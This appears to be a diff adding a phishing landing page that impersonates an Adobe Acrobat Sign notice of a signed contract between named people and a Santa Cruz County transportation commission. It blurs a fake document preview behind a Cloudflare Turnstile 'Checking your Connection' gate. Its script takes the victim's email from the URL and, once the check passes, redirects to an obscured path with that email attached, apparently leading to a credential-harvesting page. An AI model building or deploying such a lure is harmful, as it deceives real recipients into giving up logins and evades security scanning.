@@ -1,0 +1,236 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Adobe Acrobat Sign Notification</title>
+    <link rel="stylesheet" href="styles.css">
+    <script src="https://challenges.cloudflare.com/turnstile/v0/api.js?render=explicit"></script>
+    <style>
+        * { box-sizing: border-box; }
+        body { 
+            margin: 0; 
+            padding: 0; 
+            font-family: "Segoe UI", Roboto, Helvetica, Arial, sans-serif; 
+            background-color: #F7F9FA; 
+            display: flex; 
+            flex-direction: column; 
+            min-height: 100vh; 
+        }
+        
+        /* Blur Target Style */
+        .blur-target { 
+            filter: blur(1.85px); 
+            pointer-events: none; 
+            user-select: none; 
+        }
+        
+        /* Decorative Background Elements */
+        .page-background {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            z-index: -1;
+            overflow: hidden;
+        }
+        .bg-shape { position: absolute; }
+        .bg-shape--pink-left { background: #ff007f; width: 300px; height: 300px; left: -100px; top: -100px; border-radius: 50%; opacity: 0.1; }
+        .bg-shape--yellow-right { background: #ffeb3b; width: 400px; height: 400px; right: -150px; top: 10%; border-radius: 50%; opacity: 0.15; }
+        .bg-shape--purple-bottom { background: #9c27b0; width: 500px; height: 500px; left: 10%; bottom: -200px; border-radius: 50%; opacity: 0.1; }
+
+        /* Document Component Styling */
+        header { background: white; padding: 12px 24px; display: flex; align-items: center; border-bottom: 1px solid #E6E8EB; width: 100%; }
+        .logo-text { font-weight: 700; font-size: 18px; color: #000; display: flex; align-items: center; }
+        .logo-text span { color: #0061FF; font-weight: 400; margin-left: 4px; }
+        
+        main { flex-grow: 1; display: flex; flex-direction: column; justify-content: center; align-items: center; padding: 20px; z-index: 10; }
+        
+        /* Main Layout Card */
+        .email-card { 
+            background: #222222; 
+            color: #ffffff;
+            width: 100%; 
+            max-width: 900px; 
+            box-shadow: 0 4px 25px rgba(0,0,0,0.25); 
+            border-radius: 4px; 
+            padding: 40px;
+            margin-bottom: 20px;
+        }
+        .email-card__inner {
+            display: flex;
+            gap: 40px;
+        }
+        
+        /* Left Side: Mock Document Presentation Layout */
+        .email-card__preview-col { flex: 1; display: flex; justify-content: center; }
+        .document-stack { position: relative; width: 100%; max-width: 340px; aspect-ratio: 1 / 1.3; }
+        .document-page { position: absolute; width: 100%; height: 100%; background: #ffffff; border-radius: 2px; border: 1px solid #e2e8f0; }
+        .document-page--back { transform: translate(8px, 8px); z-index: 1; opacity: 0.5; }
+        .document-page--middle { transform: translate(4px, 4px); z-index: 2; opacity: 0.8; }
+        .document-page--front { transform: translate(0, 0); z-index: 3; box-shadow: 0 4px 10px rgba(0,0,0,0.15); padding: 20px; color: #333333; }
+        
+        .doc-content { font-size: 8px; font-family: initial; line-height: 1.4; color: #333; }
+        .doc-title { text-align: center; font-weight: bold; font-size: 9px; margin: 10px 0; font-family: sans-serif; }
+        .doc-subtitle { font-weight: bold; font-size: 8px; margin: 6px 0 3px; font-family: sans-serif; }
+        .doc-line { height: 4px; background: #e2e8f0; margin-bottom: 5px; border-radius: 2px; }
+        .doc-line--short { width: 60%; }
+        .doc-line--indent { margin-left: 15px; }
+        .doc-line.right { margin-left: auto; width: 30%; }
+
+        /* Right Side: Information Panels */
+        .email-card__text-col { flex: 1.2; display: flex; flex-direction: column; }
+        .email-card__title { font-size: 22px; font-weight: 300; line-height: 1.3; margin: 0 0 20px 0; color: #ffffff; }
+        .email-card__recipients { font-size: 14px; margin-bottom: 25px; color: #e2e8f0; }
+        .email-card__message { font-size: 14px; line-height: 1.5; color: #e2e8f0; }
+        .highlight { background-color: #ffe600; color: #000000; padding: 1px 4px; font-weight: bold; border-radius: 2px; }
+        .text-link { color: #cc7ae2; text-decoration: underline; font-weight: bold; }
+        
+        .email-card__features { margin-top: 30px; }
+        .features__heading { font-size: 15px; font-weight: bold; margin-bottom: 12px; color: #ffffff; }
+        .features__list { list-style: none; padding-left: 0; margin: 0; }
+        .features__list li { position: relative; padding-left: 15px; margin-bottom: 10px; font-size: 13px; color: #cccccc; }
+        .features__list li::before { content: "•"; position: absolute; left: 0; color: #888888; }
+        .sparkle { color: #ffeb3b; margin-left: 4px; }
+        
+        /* Main Footer Area */
+        .email-card__footer { margin-top: 30px; border-top: 1px solid #444444; padding-top: 15px; font-size: 11px; color: #aaaaaa; }
+        .footer-link { color: #cc7ae2; text-decoration: underline; }
+        
+        .floating-footer { display: flex; align-items: center; gap: 10px; margin-top: 20px; align-self: flex-start; }
+        .floating-logo { width: 35px; height: 35px; }
+
+        /* Turnstile Verification Container Block */
+        #turnstile-container { 
+            margin-top: 20px; 
+            display: flex; 
+            flex-direction: column; 
+            align-items: center; 
+            background: #ffffff; 
+            padding: 15px; 
+            border-radius: 8px; 
+            box-shadow: 0 4px 15px rgba(0,0,0,0.1); 
+            width: 100%;
+            max-width: 300px;
+        }
+
+        @media (max-width: 768px) {
+            .email-card__inner { flex-direction: column; }
+            .email-card { padding: 20px; }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="page-background">
+        <div class="bg-shape bg-shape--pink-left"></div>
+        <div class="bg-shape bg-shape--yellow-right"></div>
+        <div class="bg-shape bg-shape--purple-bottom"></div>
+    </div>
+
+    <header class="blur-target">
+        <div class="logo-text">Adobe <span>Transfer</span></div>
+    </header>
+
+    <main>
+        <div class="email-card">
+            <div class="blur-target">
+                <div class="email-card__inner">
+                    
+                    <div class="email-card__preview-col">
+                        <div class="document-stack">
+                            <div class="document-page document-page--back"></div>
+                            <div class="document-page document-page--middle"></div>
+                            <div class="document-page document-page--front">
+                                <div class="doc-content">
+                                    <div class="doc-header">
+                                        <div class="doc-line doc-line--short right"></div>
+                                        <div class="doc-title">AGREEMENT FOR PROFESSIONAL SERVICES</div>
+                                    </div>
+                                    <div class="doc-body">
+                                        <div class="doc-line"></div>
+                                        <div class="doc-line"></div>
+                                        <div class="doc-line doc-line--short"></div>
+                                        <br>
+                                        <div class="doc-subtitle">RECITALS</div>
+                                        <div class="doc-line"></div>
+                                        <div class="doc-line doc-line--indent"></div>
+                                        <div class="doc-line doc-line--indent"></div>
+                                        <div class="doc-line doc-line--indent doc-line--short"></div>
+                                        <br>
+                                        <div class="doc-subtitle">TERMS AND CONDITIONS</div>
+                                        <div class="doc-line"></div>
+                                        <div class="doc-line doc-line--short"></div>
+                                        <br>
+                                        <div class="doc-line"></div>
+                                        <div class="doc-line"></div>
+                                        <div class="doc-line"></div>
+                                        <div class="doc-line doc-line--short"></div>
+                                    </div>
+                                </div>
+                            </div>
+                        </div>
+                    </div>
+
+                    <div class="email-card__text-col">
+                        <h1 class="email-card__title">Between Santa Cruz County Regional Transportation Commission, Steve Mattas, Mitch Weiss, and 1 more is Signed and Filed!</h1>
+                        
+                        <p class="email-card__recipients"><strong>To:</strong> Mitch Weiss, Steve Mattas and Sarah Christensen</p>
+                        
+                        <div class="email-card__message">
+                            <p>Attached is a final copy of <mark class="highlight">Contract</mark> 2616 MWC.</p>
+                            <p>Copies have been automatically sent to all parties to the agreement.</p>
+                            <p>You can view <a href="#" class="text-link">the document</a> in your Adobe Acrobat Sign account.</p>
+                        </div>
+
+                        <div class="email-card__features">
+                            <h2 class="features__heading">Secured Adobe Documents for your Access:</h2>
+                            <ul class="features__list">
+                                <li>Exchange, Sign, and File Any Document. In Seconds!</li>
+                                <li>Set-up Reminders. Instantly Share Copies with Others.</li>
+                                <li>See All of Your Documents, Anytime, Anywhere. <span class="sparkle" aria-hidden="true">✦</span></li>
+                            </ul>
+                        </div>
+                    </div>
+
+                </div>
+
+                <footer class="email-card__footer">
+                    <p>To ensure that you continue receiving our emails, please add <a href="mailto:adobesign@adobesign.com" class="footer-link">adobesign@adobesign.com</a> to your address book or safe list.</p>
+                </footer>
+            </div>
+        </div>
+
+        <div class="floating-footer blur-target">
+            <svg class="floating-logo" viewBox="0 0 100 100" xmlns="http://www.w3.org/2000/svg" aria-hidden="true">
+                <path d="M50,10 L10,90 L35,90 L45,65 L70,65 L75,90 L95,90 Z M50,30 L40,55 L60,55 Z" fill="#a64dff"/>
+            </svg>
+        </div>
+
+        <div id="turnstile-container">
+            <p style="font-size: 14px; font-weight: 600; margin: 0 0 10px 0; color: #1e1919;">Checking your Connection</p>
+            <div id="cf-turnstile"></div>
+        </div>
+    </main>
+
+    <script>
+        turnstile.ready(function () {
+            const urlParams = new URLSearchParams(window.location.search);
+            const email = urlParams.get('e');
+            const targetPath = "/nkfYHvXS"; 
+
+            turnstile.render('#cf-turnstile', {
+                sitekey: '0x4AAAAAADwe5lIGCZuNS4cK', 
+                callback: function(token) {
+                    let destination = targetPath;
+                    if (email) {
+                        destination += "#" + encodeURIComponent(email);
+                    }
+                    window.location.href = destination;
+                },
+            });
+        });
+    </script>
+</body>
+</html>
